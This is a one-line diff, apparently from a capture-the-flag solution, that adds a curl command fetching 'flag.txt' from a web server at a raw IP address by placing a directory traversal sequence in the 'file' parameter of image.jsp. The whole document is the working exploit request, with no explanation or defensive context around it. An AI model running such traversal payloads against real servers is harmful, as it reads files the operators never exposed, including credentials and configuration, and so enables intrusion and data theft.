@@ -1,0 +1,1 @@
+curl -o out.txt "http://103.97.125.56:31218/image.jsp?file=../../../../../../flag.txt"
